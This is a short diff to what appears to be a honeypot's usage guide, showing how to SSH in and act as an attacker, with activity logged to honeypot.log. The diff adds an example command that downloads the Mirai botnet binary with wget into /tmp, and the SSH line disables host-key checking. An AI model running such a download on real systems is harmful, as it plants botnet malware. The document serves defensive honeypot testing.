@@ -88,8 +88,8 @@ ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@localhost -
 # After entering the password, you will enter the dialogue interface. Please use the Linux command to attack or display the file.
 #Example
 ls 
-#Output
-`paylist.txt  creditcard.csv  passport.pdf  documents/  photos/  scripts/`  
+#Downloading malicious files
+wget http://loclhost/mirai -O /tmp/mirai 
 
 # All attacker operations will be recorded in honeypot.log, and can also be viewed at http://localhost:8186/logs
 ```
